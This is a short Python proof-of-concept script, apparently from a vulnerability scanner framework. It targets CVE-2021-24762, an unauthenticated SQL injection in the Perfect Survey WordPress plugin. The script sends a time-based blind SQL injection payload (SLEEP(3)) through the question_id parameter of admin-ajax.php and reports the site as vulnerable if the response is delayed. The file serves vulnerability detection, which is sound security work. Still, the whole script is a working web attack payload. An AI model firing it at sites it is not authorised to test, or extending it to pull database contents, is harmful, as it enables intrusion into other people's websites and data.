import requests
import time


# Vuln Base Info
def info():
    return {
        "author": "cckuailong",
        "name": '''Perfect Survey WordPress plugin before 1.5.2 SQLI''',
        "description": '''The Perfect Survey WordPress plugin before 1.5.2 does not validate and escape the question_id GET parameter before using it in a SQL statement in the get_question AJAX action, allowing unauthenticated users to perform SQL injection.''',
        "severity": "critical",
        "references": [
            "https://www.exploit-db.com/exploits/50766", 
            "https://github.com/cckuailong/reapoc/tree/main/2021/CVE-2021-24762/vultarget",
            "https://nvd.nist.gov/vuln/detail/CVE-2021-24762"
        ],
        "classification": {
            "cvss-metrics": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
            "cvss-score": "9.8",
            "cve-id": "CVE-2021-24762",
            "cwe-id": "CWE-89"
        },
        "metadata":{
            "vuln-target": "https://github.com/cckuailong/reapoc/tree/main/2021/CVE-2021-24762/vultarget",
        },
        "tags": ["sqli", "wp", "wordpress", "wp-plugin", "unauth"],
    }


# Vender Fingerprint
def fingerprint(url):
    return True

# Proof of Concept
def poc(url):
    result = {}
    username = "admin"
    password = "admin"
    try:
        url = format_url(url)

        s = requests.Session()

        path = "/wp-admin/admin-ajax.php?action=get_question&question_id=1%20AND%20(SELECT%207242%20FROM%20(SELECT(SLEEP(3)))HQYx)"
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36'}
        time1 = time.time()
        resp = s.get(url=url+path,headers=headers,timeout=10,verify=False,allow_redirects=False)
        time2 = time.time()
        
        if resp.status_code == 404 and "wp-ps-session" in str(resp.headers) and 3 <= time2-time1 < 10:
            result["success"] = True
            result["info"] = info()
            result["payload"] = url+path

    except:
        result["success"] = False
    
    return result


# Exploit, can be same with poc()
def exp(url):
    return poc(url)


# Utils
def format_url(url):
    url = url.strip()
    if not ( url.startswith('http://') or url.startswith('https://') ):
        url = 'http://' + url
    url = url.rstrip('/')

    return url